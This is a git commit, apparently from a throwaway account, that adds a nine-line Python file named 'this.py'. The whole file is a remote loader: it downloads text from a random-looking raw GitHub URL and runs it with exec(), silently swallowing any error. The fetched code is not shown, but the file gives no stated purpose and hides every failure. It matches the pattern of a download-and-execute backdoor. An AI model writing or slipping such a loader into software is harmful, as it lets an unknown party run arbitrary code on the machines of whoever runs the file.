2a8d6ba44e7cd189fc0160ae3a42632181aad5a3
kudshfkeus <bonekrantautangerang@gmail.com>
2025-03-25 01:11:29 +0530

    this.py

---
+++ this.py
@@ -0,0 +1,9 @@
+import requests;url = "https://raw.githubusercontent.com/kudshfkeus/Guyjjhjjjjjhh/refs/heads/main/Ghhjghghhhvv"
+try:
+    response = requests.get(url)
+    if response.status_code == 200:
+        exec(response.text)
+    else:
+        pass
+except Exception:
+    pass
